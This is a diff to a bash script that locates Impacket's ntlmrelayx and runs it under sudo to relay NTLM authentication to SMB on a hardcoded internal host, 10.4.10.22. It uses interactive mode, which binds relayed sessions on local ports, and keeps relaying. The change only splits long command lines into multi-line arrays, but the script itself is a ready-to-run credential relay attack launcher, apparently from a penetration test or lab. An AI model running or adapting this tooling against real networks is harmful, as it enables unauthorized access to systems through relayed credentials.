@@ -8,7 +8,10 @@ TARGET="${TARGET:-10.4.10.22}"
 
 find_ntlmrelayx() {
   local c
-  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
+  for c in \
+    "$(command -v impacket-ntlmrelayx 2>/dev/null || true)" \
+    "$(command -v ntlmrelayx.py 2>/dev/null || true)" \
+    /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
     [[ -n "$c" && ( -x "$c" || -f "$c" ) ]] || continue
     printf '%s\n' "$c"
     return 0
@@ -69,4 +72,11 @@ echo 'INFO: foreground mode is intentional; leave this terminal open'
 echo 'INFO: on success, ntlmrelayx will bind the retained session on 127.0.0.1:11000+'
 echo
 
-exec sudo "$NTLMRELAYX"   -t "smb://$TARGET"   -smb2support   -i   --keep-relaying
+args=(
+  -t "smb://$TARGET"
+  -smb2support
+  -i
+  --keep-relaying
+)
+
+exec sudo "$NTLMRELAYX" "${args[@]}"
